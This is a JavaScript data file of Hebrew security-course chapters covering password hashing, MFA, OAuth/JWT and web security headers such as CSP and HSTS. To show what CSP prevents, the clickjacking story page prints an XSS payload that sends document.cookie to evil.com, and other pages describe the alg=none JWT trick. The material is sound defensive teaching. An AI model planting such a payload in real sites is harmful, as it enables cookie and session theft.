export const chapters111to115 = [
  {
    id: 111,
    title: "Authentication & Authorization",
    pages: [
      {
        type: "story",
        title: "הדלף שזעזע את עולם הסיסמאות",
        content: `<div dir="rtl">
<div class="scenario-box scenario-alert">
  <p><strong>🚨 תרחיש:</strong> יוני 2012 — האקר רוסי מפרסם בפורום קובץ עם 6.5 מיליון חתימות סיסמאות של LinkedIn. מהנדסי אבטחה ברחבי העולם מורידים, בודקים — ומגלים אסון.</p>
</div>

<h2>2012: הלילה ש-LinkedIn איבדה 6.5 מיליון סיסמאות</h2>

<p>ביוני 2012, האקר רוסי פרסם בפורום קובץ עם 6.5 מיליון חתימות (<code>hashes</code>) של סיסמאות מ-<code>LinkedIn</code>. מהנדסי אבטחה ברחבי העולם הורידו את הקובץ ובדקו — ותוך שעות הבינו את חומרת המצב.</p>

<p><code>LinkedIn</code> השתמשה ב-<code>SHA-1</code> בלי <code>salt</code>. בלי מלח. בשנת 2012. זה כמו לנעול את הכספת עם מנעול מספרים ולהדביק את הקוד על הדלת.</p>

<p>תוך 72 שעות, חוקרים פיצחו למעלה מ-90% מהסיסמאות. הסיסמה הנפוצה ביותר? <code>123456</code>. השנייה? <code>linkedin</code>. השלישית? <code>password</code>.</p>

<div class="stat-highlight"><span class="stat-number">117M</span><span class="stat-unit">סיסמאות שדלפו בפועל</span></div>
<div class="stat-highlight"><span class="stat-number">$2,200</span><span class="stat-unit">מחיר הקובץ המלא ב-Dark Web (5 BTC)</span></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> ב-2016 התגלה שהמספר האמיתי היה 117 מיליון סיסמאות — לא 6.5 מיליון. הקובץ המלא נמכר ב-Dark Web ב-5 Bitcoin (כ-$2,200 באותה תקופה). סיסמאות שנפרצו תוך שניות היו שוות מיליארדים בנזק.</div>

<p>האירוע הזה שינה את התעשייה. חברות עברו ל-<code>bcrypt</code>, משתמשים גילו את <code>MFA</code>, וכולם הבינו: <strong>הדרך שבה אנחנו מאמתים זהות — שבורה מהיסוד.</strong></p>
</div>`
      },
      {
        type: "explanation",
        title: "Authentication vs Authorization — אנלוגיית המלון",
        content: `<div dir="rtl">
<h2>שני מושגים, שאלה אחת לכל אחד</h2>

<p>תחשבו על מלון יוקרה. כשאתם מגיעים לדלפק הקבלה, הפקידה שואלת שתי שאלות:</p>

<p><strong>שאלה 1: "מי אתה?"</strong> — תראה לי תעודת זהות. זה <code>Authentication</code> (אימות). אני מוודאת שאתה באמת מי שאתה טוען שאתה.</p>

<p><strong>שאלה 2: "מה מותר לך?"</strong> — הכרטיס שלך פותח את חדר 412, את חדר הכושר, ואת הבריכה. אבל לא את הסוויטה הנשיאותית. זה <code>Authorization</code> (הרשאה).</p>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>🔐 Authentication (AuthN)</h4><p><strong>שאלה:</strong> מי אתה?</p><p><strong>אנלוגיה:</strong> תעודת זהות בקבלה</p><p><strong>טכנית:</strong> Login עם שם משתמש + סיסמה</p></div>
  <div class="vs-card vs-good"><h4>🛡️ Authorization (AuthZ)</h4><p><strong>שאלה:</strong> מה מותר לך?</p><p><strong>אנלוגיה:</strong> כרטיס חדר שפותח דלתות ספציפיות</p><p><strong>טכנית:</strong> role: admin יכול למחוק משתמשים</p></div>
</div>

<table class="content-table">
  <tr><th>מושג</th><th>שאלה</th><th>אנלוגיה</th><th>דוגמה טכנית</th></tr>
  <tr><td><strong><code>Authentication</code> (<code>AuthN</code>)</strong></td><td>מי אתה?</td><td>תעודת זהות בקבלה</td><td><code>Login</code> עם שם משתמש + סיסמה</td></tr>
  <tr><td><strong><code>Authorization</code> (<code>AuthZ</code>)</strong></td><td>מה מותר לך?</td><td>כרטיס חדר שפותח דלתות ספציפיות</td><td><code>role: admin</code> יכול למחוק משתמשים</td></tr>
</table>

<h3>שלושת גורמי האימות</h3>
<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🧠</div><div class="mini-card-title">משהו שאתה יודע</div><div class="mini-card-desc">סיסמה, PIN, שאלת אבטחה</div></div>
  <div class="mini-card"><div class="mini-card-icon">📱</div><div class="mini-card-title">משהו שיש לך</div><div class="mini-card-desc">טלפון, YubiKey, כרטיס חכם</div></div>
  <div class="mini-card"><div class="mini-card-icon">👆</div><div class="mini-card-title">משהו שאתה</div><div class="mini-card-desc">טביעת אצבע, זיהוי פנים, רשתית</div></div>
</div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> אימות תמיד בא לפני הרשאה. אי אפשר להחליט מה מותר לך אם לא יודעים מי אתה. בקוד: קודם <code>middleware</code> של <code>auth</code>, ואז בדיקת <code>permissions</code>.</div>

<p>הטעות הנפוצה ביותר? לבלבל בין השניים. מפתח שכותב <code>if (user.isLoggedIn)</code> לפני פעולת מחיקה — עשה <code>Authentication</code> אבל שכח <code>Authorization</code>. כל משתמש מחובר יכול למחוק.</p>

<p><strong>כלל הזהב:</strong> <code>Authentication</code> = "הוכח מי אתה". <code>Authorization</code> = "הוכח שמותר לך".</p>
</div>`
      },
      {
        type: "explanation",
        title: "למה סיסמאות נכשלות — מתקפות וזמני פריצה",
        content: `<div dir="rtl">
<h2>הסיסמה שלך — כמה זמן עד שנפרצת?</h2>

<div class="stat-highlight"><span class="stat-number">164B</span><span class="stat-unit">חתימות MD5 בשנייה עם RTX 4090</span></div>

<p>מחשב עם כרטיס מסך <code>RTX 4090</code> יכול לנסות <strong>164 מיליארד</strong> חתימות <code>MD5</code> בשנייה. בואו נראה מה זה אומר:</p>

<table class="content-table">
  <tr><th>סיסמה</th><th>אורך</th><th>זמן פריצה (<code>MD5</code>)</th><th>זמן פריצה (<code>bcrypt</code>)</th></tr>
  <tr><td><code>123456</code></td><td>6 תווים</td><td>פחות מ-1 שנייה</td><td>פחות מ-1 שנייה (ב-wordlist)</td></tr>
  <tr><td><code>Summer2024!</code></td><td>11 תווים</td><td>~3 דקות (dictionary)</td><td>~2 שנים</td></tr>
  <tr><td>8 תווים אקראיים</td><td>8 תווים</td><td>~5 שעות</td><td>~99 שנים</td></tr>
  <tr><td>16 תווים אקראיים</td><td>16 תווים</td><td>~מיליוני שנים</td><td>לא ריאלי</td></tr>
</table>

<p><strong>שלוש שיטות הפריצה העיקריות:</strong></p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>1. Brute Force</strong><p>ניסוי כל הצירופים האפשריים. עובד מעולה על סיסמאות קצרות, לוקח נצח על ארוכות.</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>2. Dictionary Attack</strong><p>שימוש ברשימת מילים נפוצות. הרשימה <code>rockyou.txt</code> מכילה 14 מיליון סיסמאות אמיתיות שדלפו. רוב האנשים משתמשים בסיסמאות שנמצאות שם.</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>3. Rainbow Tables</strong><p>טבלאות מחושבות מראש של חתימות. במקום לחשב כל <code>hash</code> בזמן אמת, פשוט מחפשים בטבלה. עובד רק אם אין <code>salt</code> — וזו בדיוק הטעות של LinkedIn.</p></div></div>
</div>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> סיסמאות מ-<code>data breaches</code> ישנים נמכרות ומשמשות ל-<code>credential stuffing</code> — ניסיון אותה סיסמה באתרים אחרים. 65% מהאנשים משתמשים באותה סיסמה במספר אתרים.</div>
</div>`
      },
      {
        type: "demo",
        title: "Hashing נכון — bcrypt, Argon2 והדגמת זמני פריצה",
        content: `<div dir="rtl">
<h2>ההבדל בין <code>hash</code> מהיר ל-<code>hash</code> מאובטח</h2>

<p><code>MD5</code> ו-<code>SHA-1</code> תוכננו להיות <strong>מהירים</strong>. זה מצוין לאימות שלמות קבצים — ונורא לסיסמאות. אלגוריתם <code>hash</code> לסיסמאות צריך להיות <strong>איטי בכוונה</strong>.</p>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ MD5 / SHA-1</h4><p>164 מיליארד ניסיונות/שנייה</p><p>ללא Salt מובנה</p><p>סיסמה בת 8 תווים = 5 שעות</p><p><span class="phase-badge phase-red">לא מומלץ</span></p></div>
  <div class="vs-card vs-good"><h4>✅ bcrypt / Argon2id</h4><p>~1,000 ניסיונות/שנייה (Argon2)</p><p>Salt מובנה + עלות זיכרון</p><p>סיסמה בת 8 תווים = 99+ שנים</p><p><span class="phase-badge phase-green">מומלץ בחום</span></p></div>
</div>

<table class="content-table">
  <tr><th>אלגוריתם</th><th>סוג</th><th><code>Salt</code> מובנה?</th><th>ניסיונות/שנייה (<code>GPU</code>)</th><th>מומלץ?</th></tr>
  <tr><td><code>MD5</code></td><td>מהיר</td><td>לא</td><td>164 מיליארד</td><td>לא</td></tr>
  <tr><td><code>SHA-256</code></td><td>מהיר</td><td>לא</td><td>8 מיליארד</td><td>לא</td></tr>
  <tr><td><code>bcrypt</code></td><td>איטי (מכוון)</td><td>כן</td><td>~184,000</td><td>כן</td></tr>
  <tr><td><code>Argon2id</code></td><td>איטי + זיכרון</td><td>כן</td><td>~1,000</td><td>הכי מומלץ</td></tr>
</table>

<p><strong>מה זה <code>Salt</code>?</strong> ערך אקראי שמצורף לסיסמה לפני חישוב ה-<code>hash</code>. כך שתי סיסמאות זהות מקבלות <code>hash</code> שונה — ו-<code>rainbow tables</code> הופכות לחסרות ערך.</p>

<div class="code-preview"><pre><code># Python: bcrypt — התקן בתעשייה
import bcrypt

# יצירת hash (salt נוצר אוטומטית)
password = "MySecurePass123!"
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# rounds=12 = 2^12 = 4,096 iterations
# התוצאה: $2b$12$LJ3m5ZQkJHD.../...

# אימות
if bcrypt.checkpw(password.encode(), hashed):
    print("Valid!")

# -------------------------------------------

# Python: Argon2id — הזהב החדש (OWASP recommended)
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=2,        # 2 iterations
    memory_cost=65536,  # 64 MB RAM
    parallelism=2       # 2 threads
)

hash = ph.hash("MySecurePass123!")
# התוצאה: $argon2id$v=19$m=65536,t=2,p=2$...

# אימות
try:
    ph.verify(hash, "MySecurePass123!")
    print("Valid!")
except argon2.exceptions.VerifyMismatchError:
    print("Invalid!")</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>Argon2id</code> דורש גם זמן וגם זיכרון — מה שהופך מתקפות <code>GPU</code> מקביליות ליקרות מאוד. כרטיס <code>GPU</code> שמריץ מיליארדי <code>MD5</code> בשנייה יכול לנסות רק אלף <code>Argon2</code>.</div>
</div>`
      },
      {
        type: "explanation",
        title: "MFA — שכבות הגנה מעבר לסיסמה",
        content: `<div dir="rtl">
<h2><code>Multi-Factor Authentication</code> — שלושה גורמים</h2>

<p>גורם אימות נופל לאחת משלוש קטגוריות:</p>

<table class="content-table">
  <tr><th>גורם</th><th>מה זה</th><th>דוגמאות</th></tr>
  <tr><td><strong>משהו שאתה יודע</strong></td><td>ידע</td><td>סיסמה, <code>PIN</code>, שאלת אבטחה</td></tr>
  <tr><td><strong>משהו שיש לך</strong></td><td>חזקה</td><td>טלפון (<code>TOTP</code>), <code>YubiKey</code>, כרטיס חכם</td></tr>
  <tr><td><strong>משהו שאתה</strong></td><td>ביומטריה</td><td>טביעת אצבע, זיהוי פנים, סריקת רשתית</td></tr>
</table>

<p><code>MFA</code> אמיתי דורש <strong>שני גורמים מקטגוריות שונות</strong>. סיסמה + שאלת אבטחה = שני דברים מאותה קטגוריה = לא <code>MFA</code> אמיתי.</p>

<p><strong>סוגי <code>MFA</code> — מהחלש לחזק:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">📱</div><div class="mini-card-title">SMS OTP</div><div class="mini-card-desc">קוד חד-פעמי ב-SMS. <span class="phase-badge phase-gold">בינוני</span> — פגיע ל-SIM swapping ויירוט SS7</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔢</div><div class="mini-card-title">TOTP (Google Auth)</div><div class="mini-card-desc">קוד מתחלף כל 30 שניות. <span class="phase-badge phase-blue">טוב</span> — פגיע לפישינג בזמן אמת</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔔</div><div class="mini-card-title">Push Notifications</div><div class="mini-card-desc">אישור באפליקציה. <span class="phase-badge phase-blue">טוב</span> — פגיע ל-MFA fatigue (הצפת בקשות)</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔑</div><div class="mini-card-title">FIDO2 / WebAuthn</div><div class="mini-card-desc">מפתח הצפנה פיזי. <span class="phase-badge phase-green">מצוין</span> — עמיד לפישינג לחלוטין</div></div>
</div>

<table class="content-table">
  <tr><th>שיטה</th><th>עיקרון</th><th>חוזק</th><th>חולשה</th></tr>
  <tr><td><code>SMS OTP</code></td><td>קוד חד-פעמי ב-SMS</td><td>בינוני</td><td><code>SIM swapping</code>, יירוט <code>SS7</code></td></tr>
  <tr><td><code>TOTP</code> (<code>Google Auth</code>)</td><td>קוד מתחלף כל 30 שניות</td><td>טוב</td><td>פישינג בזמן אמת</td></tr>
  <tr><td><code>Push notifications</code></td><td>אישור באפליקציה</td><td>טוב</td><td><code>MFA fatigue</code> (הצפת בקשות)</td></tr>
  <tr><td><code>FIDO2</code> / <code>WebAuthn</code></td><td>מפתח הצפנה פיזי</td><td>מצוין</td><td>עמיד לפישינג לחלוטין</td></tr>
</table>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> בספטמבר 2022, האקרים פרצו ל-<code>Uber</code> באמצעות <code>MFA fatigue</code> — שלחו עשרות בקשות <code>push</code> לעובד עד שלחץ "אשר" מתוך תסכול. תמיד העדיפו <code>FIDO2</code> על פני <code>push</code>.</div>

<p><strong>למה <code>FIDO2</code>/<code>WebAuthn</code> עמידים לפישינג?</strong></p>
<p>המפתח הפיזי מקושר לדומיין (<code>origin</code>). אם אתר הפישינג הוא <code>g00gle.com</code> במקום <code>google.com</code> — המפתח פשוט לא עובד. אין מה "לגנוב" כי אין קוד שעובר ברשת.</p>

<div class="success-box"><strong>✅ המלצה:</strong> השתמשו ב-<code>FIDO2</code> / <code>WebAuthn</code> (כמו YubiKey) בכל מקום שאפשר. זו ההגנה החזקה ביותר מפני פישינג — המפתח קשור לדומיין ואין קוד שניתן לגנוב.</div>
</div>`
      },
      {
        type: "explanation",
        title: "OAuth2 ו-JWT — אנלוגיית מפתח החנייה",
        content: `<div dir="rtl">
<h2><code>OAuth 2.0</code> — מפתח החנייה של האינטרנט</h2>

<p>כשאתם נותנים את הרכב לחנייה עם שירות <code>valet</code>, אתם לא נותנים את המפתח הראשי. אתם נותנים <strong>מפתח חנייה</strong> — הוא מפעיל את המנוע אבל לא פותח את תא הכפפות.</p>

<p><code>OAuth 2.0</code> עובד בדיוק ככה. כשאפליקציה מבקשת גישה לחשבון <code>Google</code> שלכם, היא לא מקבלת את הסיסמה — היא מקבלת <code>token</code> מוגבל שמאפשר רק מה שאישרתם.</p>

<p><strong>הזרימה בקצרה:</strong></p>

<div class="attack-chain defense-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>Step 1: Redirect</strong><p>אפליקציה מפנה אתכם ל-<code>Google</code> ("התחבר עם Google")</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 2: Consent</strong><p>אתם מאשרים: "כן, תן לאפליקציה לקרוא את השם והאימייל שלי"</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 3: Auth Code</strong><p><code>Google</code> מחזירה <code>authorization code</code> לאפליקציה</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 4: Token Exchange</strong><p>האפליקציה מחליפה את הקוד ב-<code>access token</code></p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 5: API Access</strong><p>האפליקציה משתמשת ב-<code>token</code> לגשת ל-<code>API</code> — רק למה שאישרתם</p></div></div>
</div>

<ol>
<li>אפליקציה מפנה אתכם ל-<code>Google</code> ("התחבר עם Google")</li>
<li>אתם מאשרים: "כן, תן לאפליקציה לקרוא את השם והאימייל שלי"</li>
<li><code>Google</code> מחזירה <code>authorization code</code> לאפליקציה</li>
<li>האפליקציה מחליפה את הקוד ב-<code>access token</code></li>
<li>האפליקציה משתמשת ב-<code>token</code> לגשת ל-<code>API</code> — רק למה שאישרתם</li>
</ol>

<h3><code>JWT</code> — <code>JSON Web Token</code></h3>

<p><code>JWT</code> הוא פורמט נפוץ ל-<code>tokens</code>. הוא מכיל שלושה חלקים מופרדים בנקודות:</p>

<div class="code-preview"><pre><code># מבנה JWT: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJ...

# Header (base64) - מטא-דאטה
{"alg": "HS256", "typ": "JWT"}

# Payload (base64) - הנתונים עצמם
{
  "sub": "user123",
  "name": "Hila Cohen",
  "role": "admin",
  "exp": 1700000000    // תוקף
}

# Signature - חתימה שמוודאת שלא שינו את התוכן
HMACSHA256(base64url(header) + "." + base64url(payload), secret)</code></pre></div>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> פגיעות <code>alg=none</code> — תוקף משנה את ה-<code>header</code> ל-<code>{"alg": "none"}</code> ומסיר את החתימה. שרת פגיע מקבל את ה-<code>token</code> בלי אימות. <strong>תמיד</strong> הגדירו <code>whitelist</code> של אלגוריתמים מותרים בצד השרת.</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האם הסיסמה מתה?",
        intro: "<p>סיסמאות מלוות אותנו מאז שנות ה-60 של המאה הקודמת. אבל עם 80% מהפריצות שמערבות סיסמאות גנובות או חלשות — אולי הגיע הזמן להיפרד?</p>",
        blocks: [
          {
            title: "Passkeys — היורש הטבעי",
            icon: "🔑",
            content: "<code>Passkeys</code> (מבוססי <code>FIDO2</code>) מחליפים סיסמאות לחלוטין. במקום לזכור משהו, המכשיר שלכם מחזיק מפתח הצפנה ייחודי לכל אתר. <code>Apple</code>, <code>Google</code> ו-<code>Microsoft</code> כבר תומכים. אין מה לגנוב, אין מה לפשל, אין מה לשכוח."
          },
          {
            title: "ביומטריה — לא מושלמת",
            icon: "👁️",
            content: "טביעת אצבע וזיהוי פנים נוחים, אבל יש בעיה מהותית: אי אפשר לשנות ביומטריה. אם טביעת האצבע שלכם דלפה — זה לנצח. לכן ביומטריה היא <strong>מזהה</strong>, לא <strong>סוד</strong>. תמיד צריך אותה יחד עם גורם נוסף."
          },
          {
            title: "Zero Trust — לא סומכים על אף אחד",
            icon: "🛡️",
            content: "במודל <code>Zero Trust</code>, אימות מתמשך הוא העיקרון המרכזי. לא מספיק להתחבר פעם אחת — המערכת בודקת ברציפות: האם המכשיר מוכר? האם ה-<code>IP</code> חשוד? האם ההתנהגות חריגה? כל גישה נבדקת מחדש."
          },
          {
            title: "העתיד: אימות בלתי נראה",
            icon: "🔮",
            content: "חברות כמו <code>BioCatch</code> (ישראלית!) מנתחות את <strong>הדרך</strong> שבה אתם מקלידים, מזיזים עכבר, ומחזיקים טלפון. זהו אימות מתמשך וסמוי שלא דורש מהמשתמש כלום. עתיד האימות הוא שקוף — תדעו שאתם מאומתים בלי להרגיש."
          }
        ]
      }
    ]
  },
  {
    id: 112,
    title: "Web Security Headers",
    pages: [
      {
        type: "story",
        title: "שורה אחת של JavaScript ששדדה בנק",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
  <p><strong>💀 תרחיש:</strong> אתם גולשים באתר שנראה לגיטימי. ברקע, האתר טוען את אתר הבנק שלכם ב-iframe בלתי נראה. הכפתור "שלח" שלוחצים? מונח בדיוק מעל "העבר כסף" של הבנק.</p>
</div>

<h2>כשאתר הבנק שלך חשוף — בלי שאתה יודע</h2>

<p>דמיינו תרחיש: אתם גולשים באתר שנראה לגיטימי לחלוטין. ברקע, בלי שתשימו לב, האתר טוען את אתר הבנק שלכם בתוך <code>iframe</code> בלתי נראה. הכפתור "שלח" שאתם לוחצים? הוא מונח בדיוק מעל כפתור "העבר כסף" של הבנק.</p>

<p>זו מתקפת <code>Clickjacking</code>. וכל מה שהיה צריך כדי למנוע אותה? <strong>שורה אחת</strong> ב-<code>headers</code> של השרת.</p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>Step 1: פיתוי</strong><p>תוקף יוצר אתר שנראה לגיטימי עם כפתור "שלח" אטרקטיבי</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 2: iframe נסתר</strong><p>ברקע, האתר טוען את אתר הבנק ב-<code>iframe</code> שקוף (opacity: 0)</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Step 3: Clickjacking</strong><p>הכפתור של התוקף מונח מעל כפתור "העבר כסף" — לחיצה = העברת כסף</p></div></div>
</div>

<p>או תרחיש אחר: תוקף מזריק <code>JavaScript</code> זדוני לתגובה בפורום של האתר. כל מי שקורא את התגובה — הסקריפט רץ בדפדפן שלו, גונב <code>cookies</code>, ומעביר אותם לשרת התוקף. זו מתקפת <code>XSS</code>.</p>

<div class="code-preview"><pre><code>&lt;!-- הסקריפט הזדוני שהוזרק לתגובה --&gt;
&lt;script&gt;
  fetch("https://evil.com/steal?cookie=" + document.cookie);
&lt;/script&gt;

&lt;!-- מה שהיה חוסם את זה: header אחד --&gt;
Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> מחקר של <code>Scott Helme</code> ב-2023 מצא שרק 12% מאתרי ה-<code>top million</code> משתמשים ב-<code>Content-Security-Policy</code>. רוב האינטרנט עדיין חשוף למתקפות שניתן למנוע עם כמה שורות קונפיגורציה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Security Headers — השריון של האתר שלך",
        content: `<div dir="rtl">
<h2>מה הם <code>Security Headers</code>?</h2>

<p>כשדפדפן שולח בקשה לשרת, השרת מחזיר תגובה. חלק מהתגובה הוא <code>headers</code> — מטא-דאטה שהדפדפן קורא ופועל לפיו. <code>Security Headers</code> הם הוראות לדפדפן: "הגן על המשתמש בדרכים הבאות".</p>

<p>חשבו על זה כמו <strong>שריון</strong>: האתר עצמו יכול להיות מקודד בצורה מושלמת, אבל בלי <code>headers</code> — הוא עומד עירום מול מתקפות.</p>

<div class="tool-card">
  <div class="tool-card-icon">🛡️</div>
  <div class="tool-card-body"><strong>Content-Security-Policy</strong><p>מגן מפני <code>XSS</code> והזרקת קוד. ערך: <code>default-src 'self'</code> <span class="phase-badge phase-red">קריטי</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🔒</div>
  <div class="tool-card-body"><strong>Strict-Transport-Security (HSTS)</strong><p>מגן מפני <code>SSL Stripping</code>. כופה HTTPS תמיד. <span class="phase-badge phase-red">קריטי</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🖼️</div>
  <div class="tool-card-body"><strong>X-Frame-Options</strong><p>מגן מפני <code>Clickjacking</code>. ערך: <code>DENY</code>. <span class="phase-badge phase-red">קריטי</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">📄</div>
  <div class="tool-card-body"><strong>X-Content-Type-Options</strong><p>מונע <code>MIME sniffing</code>. ערך: <code>nosniff</code>. <span class="phase-badge phase-gold">חשוב</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🔗</div>
  <div class="tool-card-body"><strong>Referrer-Policy</strong><p>מונע דליפת URL. ערך: <code>strict-origin-when-cross-origin</code>. <span class="phase-badge phase-gold">חשוב</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">📷</div>
  <div class="tool-card-body"><strong>Permissions-Policy</strong><p>חוסם גישה ל-APIs רגישים (מצלמה, מיקרופון). <span class="phase-badge phase-blue">מומלץ</span></p></div>
</div>

<table class="content-table">
  <tr><th><code>Header</code></th><th>נגד מה מגן</th><th>ערך מומלץ</th><th>מה קורה בלעדיו</th></tr>
  <tr><td><code>Content-Security-Policy</code></td><td><code>XSS</code>, הזרקת קוד</td><td><code>default-src 'self'</code></td><td>כל סקריפט זדוני רץ בדפדפן</td></tr>
  <tr><td><code>Strict-Transport-Security</code></td><td><code>SSL Stripping</code></td><td><code>max-age=31536000; includeSubDomains</code></td><td>תוקף יכול לשדרג לאחור ל-<code>HTTP</code></td></tr>
  <tr><td><code>X-Frame-Options</code></td><td><code>Clickjacking</code></td><td><code>DENY</code></td><td>האתר ניתן לטעינה ב-<code>iframe</code> זדוני</td></tr>
  <tr><td><code>X-Content-Type-Options</code></td><td><code>MIME sniffing</code></td><td><code>nosniff</code></td><td>דפדפן "מנחש" סוג קובץ — ומפעיל <code>JS</code> מסוכן</td></tr>
  <tr><td><code>Referrer-Policy</code></td><td>דליפת <code>URL</code></td><td><code>strict-origin-when-cross-origin</code></td><td>אתרים חיצוניים רואים את ה-<code>URL</code> המלא שלכם</td></tr>
  <tr><td><code>Permissions-Policy</code></td><td>גישה ל-<code>APIs</code> רגישים</td><td><code>camera=(), microphone=(), geolocation=()</code></td><td>סקריפט צד שלישי יכול לגשת למצלמה</td></tr>
</table>

<div class="success-box"><strong>✅ בדקו את האתר שלכם:</strong> גלשו ל-<code>securityheaders.com</code> והכניסו כתובת — תקבלו ציון מ-<code>A+</code> עד <code>F</code> ורשימת <code>headers</code> חסרים.</div>
</div>`
      },
      {
        type: "demo",
        title: "CSP, HSTS ו-Headers — לפני ואחרי",
        content: `<div dir="rtl">
<h2>הגדרת <code>Security Headers</code> — דוגמאות מעשיות</h2>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ ללא Security Headers</h4><p>XSS רץ חופשי בדפדפן</p><p>Clickjacking ב-iframe נסתר</p><p>SSL Stripping מוריד ל-HTTP</p><p>MIME sniffing מריץ JS מסוכן</p></div>
  <div class="vs-card vs-good"><h4>✅ עם Security Headers</h4><p>CSP חוסם סקריפטים זדוניים</p><p>X-Frame-Options חוסם iframes</p><p>HSTS כופה HTTPS תמיד</p><p>nosniff מונע ניחוש סוג קובץ</p></div>
</div>

<p><strong><code>Content-Security-Policy</code> — דוגמאות מהפשוט למורכב:</strong></p>

<div class="code-preview"><pre><code># בסיסי — טען הכל רק ממקור עצמי
Content-Security-Policy: default-src 'self'

# אתר עם CDN ו-Google Fonts
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  frame-ancestors 'none'

# עם nonce (חד-פעמי) — בטוח יותר מ-'unsafe-inline'
Content-Security-Policy:
  script-src 'nonce-abc123random'

# בדף ה-HTML:
&lt;script nonce="abc123random"&gt;
  // סקריפט לגיטימי — רץ
&lt;/script&gt;
&lt;script&gt;
  // סקריפט מוזרק — נחסם! אין לו nonce
&lt;/script&gt;

# Report-Only mode — לא חוסם, רק מדווח (מושלם לבדיקות)
Content-Security-Policy-Report-Only:
  default-src 'self'; report-uri /csp-report</code></pre></div>

<p><strong><code>HSTS</code> — כופה <code>HTTPS</code> תמיד:</strong></p>

<div class="code-preview"><pre><code># ללא HSTS — תוקף יכול לעשות SSL Stripping:
# 1. משתמש מקליד http://bank.com
# 2. תוקף ב-Man-in-the-Middle מונע redirect ל-HTTPS
# 3. התעבורה עוברת ב-HTTP גלוי = הכל נחשף

# עם HSTS:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# הדפדפן זוכר: "bank.com = HTTPS בלבד" למשך שנה
# preload = הדפדפן יודע את זה עוד לפני הביקור הראשון

# Nginx configuration:
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "CSP לעומק — איך חוסמים XSS",
        content: `<div dir="rtl">
<h2><code>Content-Security-Policy</code> — העומק</h2>

<div class="info-box"><strong>ℹ️ מידע:</strong> <code>CSP</code> היא ה-header החזקה ביותר והמורכבת ביותר. היא עובדת בשיטת <code>whitelist</code> — רק מה שמפורשות אישרתם יכול לרוץ. <span class="phase-badge phase-red">חובה</span> בכל אתר מודרני.</div>

<p><code>CSP</code> היא ה-<code>header</code> החזקה ביותר והמורכבת ביותר. היא עובדת בשיטת <code>whitelist</code> — רק מה שמפורשות אישרתם יכול לרוץ.</p>

<p><strong>הדירקטיבות המרכזיות:</strong></p>

<table class="content-table">
  <tr><th>דירקטיבה</th><th>שולטת על</th><th>דוגמה</th></tr>
  <tr><td><code>default-src</code></td><td>ברירת מחדל לכולם</td><td><code>'self'</code></td></tr>
  <tr><td><code>script-src</code></td><td><code>JavaScript</code></td><td><code>'self' 'nonce-xyz'</code></td></tr>
  <tr><td><code>style-src</code></td><td><code>CSS</code></td><td><code>'self' 'unsafe-inline'</code></td></tr>
  <tr><td><code>img-src</code></td><td>תמונות</td><td><code>'self' data: https:</code></td></tr>
  <tr><td><code>connect-src</code></td><td><code>fetch/XHR/WebSocket</code></td><td><code>'self' https://api.example.com</code></td></tr>
  <tr><td><code>frame-ancestors</code></td><td>מי יכול לטעון אותך ב-<code>iframe</code></td><td><code>'none'</code></td></tr>
  <tr><td><code>form-action</code></td><td>לאן טפסים יכולים לשלוח</td><td><code>'self'</code></td></tr>
</table>

<p><strong>איך <code>CSP</code> חוסמת <code>XSS</code>? שלושה מנגנונים:</strong></p>

<p><strong>1. חסימת <code>inline scripts</code>:</strong> ברירת המחדל של <code>CSP</code> חוסמת <code>&lt;script&gt;</code> משובצים בדף. תוקף שמזריק <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — הקוד לא ירוץ.</p>

